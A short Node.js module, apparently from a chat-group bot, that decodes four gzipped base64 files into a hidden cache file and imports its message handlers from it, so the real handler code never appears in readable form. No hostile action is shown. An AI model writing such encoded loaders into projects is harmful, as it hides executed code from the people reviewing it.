import { writeFileSync, existsSync, readFileSync } from 'fs'
import { gunzipSync } from 'zlib'
import { fileURLToPath, pathToFileURL } from 'url'
import path from 'path'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const CACHE = path.join(__dirname, '.handler.cache.js')

function ensure() {
  if (existsSync(CACHE)) return CACHE
  const parts = ['handler.part1.b64','handler.part2.b64','handler.part3.b64','handler.part4.b64']
  const chunks = parts.map(f => gunzipSync(Buffer.from(readFileSync(path.join(__dirname, f), 'utf8'), 'base64')))
  writeFileSync(CACHE, Buffer.concat(chunks))
  return CACHE
}

const mod = await import(pathToFileURL(ensure()).href)
export const handleMessage = mod.handleMessage
export const handleGroupParticipantsUpdate = mod.handleGroupParticipantsUpdate
